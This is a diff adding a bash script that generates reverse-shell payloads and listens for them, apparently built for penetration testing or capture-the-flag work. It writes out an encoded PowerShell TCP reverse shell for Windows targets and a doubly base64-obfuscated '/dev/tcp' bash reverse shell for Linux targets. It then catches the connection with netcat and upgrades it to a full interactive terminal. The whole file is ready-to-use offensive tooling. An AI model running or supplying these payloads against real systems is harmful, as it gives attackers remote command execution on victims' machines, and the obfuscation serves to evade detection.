@@ -1,0 +1,108 @@
+#!/bin/bash
+
+# Check required packages
+for cmd in nc rlwrap script iconv ss awk grep hostname ip base64; do
+    command -v $cmd >/dev/null 2>&1 || { echo "[!] Error: '$cmd' is required but not installed."; exit 1; }
+done
+
+TTY=$(tty)
+w=0
+show_payload=0
+
+# Auto-detect IP
+if ip link show tun0 &>/dev/null; then
+    IP="$(ip addr show tun0 | grep 'inet ' | awk '{ print $2 }' | cut -d/ -f1)"
+else
+    IP="$(hostname -I | awk '{ print $1 }')"
+fi
+
+# Help
+usage() {
+    echo "Usage: $0 <port> [-w] [-i <ip>] [-p]"
+    echo ""
+    echo "  <port>         Port to listen on (required)"
+    echo "  -i <ip>        IP address to use (default: $IP)"
+    echo "  -w             Expect Windows reverse shell"
+    echo "  -p, --payload  Print generated reverse shell payload"
+    echo "  -h, --help     Show this help message"
+    exit 1
+}
+
+# Start listener
+listen() {
+
+    if [[ $w -eq 1 ]]; then
+        PAYLOAD=$(echo '$c=New-Object Net.Sockets.TCPClient("$IP",$PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$r2=$r+"PS "+[System.Management.Automation.PathInfo].GetProperty("Path").GetValue((pwd))+"> ";$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()' | sed -e "s/\$IP/$IP/" -e "s/\$PORT/$PORT/" | iconv -t UTF-16LE | base64 -w 0 | xargs echo "powershell -e")
+
+        if [[ $show_payload -eq 1 ]]; then
+            echo -e "[+] Payload ($IP:$PORT):\n$PAYLOAD\n"
+        fi
+
+        bash -c "trap 'stty sane' EXIT; ( stty -F $TTY intr ''; touch /tmp/rlwrap_history; rlwrap -A! -c -D 2 -i -f . -H /tmp/rlwrap_history -r -s 1000 nc -nlvp $PORT ) <&0 & sleep 0.1; stty -F $TTY sane; while ss -tln | grep -q ':443'; do sleep 0.1; done; wait"
+    else
+        PAYLOAD=$(echo "echo $(echo -e "bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\" & disown" | base64 -w 0 | base64 -w 0) | base64 -d | base64 -d | bash")
+
+        if [[ $show_payload -eq 1 ]]; then
+            echo -e "[+] Payload ($IP:$PORT):\n$PAYLOAD\n"
+        fi
+
+        ( echo "SHELL=/bin/bash TERM=xterm-256color /usr/bin/script -q /dev/null -c 'stty rows $(tput lines) cols $(tput cols); exec \$SHELL'"; /bin/cat; trap 'stty sane' EXIT ) | nc -nlvp $PORT | ( read; stty -F $TTY raw -echo; /bin/cat )
+    fi
+}
+
+# Parse arguments
+if [ "$#" -eq 0 ]; then usage; fi
+
+POSITIONAL_ARGS=()
+
+while [[ "$#" -gt 0 ]]; do
+    case "$1" in
+        -i)
+            IP="$2"
+            shift 2
+            ;;
+        -w)
+            w=1
+            shift
+            ;;
+        -p|--payload)
+            show_payload=1
+            shift
+            ;;
+        -h|--help)
+            usage
+            ;;
+        -*)
+            echo "[!] Unknown option: $1"
+            usage
+            ;;
+        *)
+            POSITIONAL_ARGS+=("$1")
+            shift
+            ;;
+    esac
+done
+
+# Port validation
+is_valid_port() {
+    [[ "$1" =~ ^[0-9]+$ ]] && [ "$1" -ge 1 ] && [ "$1" -le 65535 ]
+}
+
+if [ "${#POSITIONAL_ARGS[@]}" -ne 1 ]; then
+    echo "[!] Error: You must specify exactly one port."
+    usage
+fi
+
+PORT="${POSITIONAL_ARGS[0]}"
+
+if ! is_valid_port "$PORT"; then
+    echo "[!] Error: '$PORT' is not a valid port number."
+    exit 1
+fi
+
+if ss -tln | grep -q ":$PORT"; then
+    echo "[!] Error: Port $PORT is already in use."
+    exit 1
+fi
+
+listen
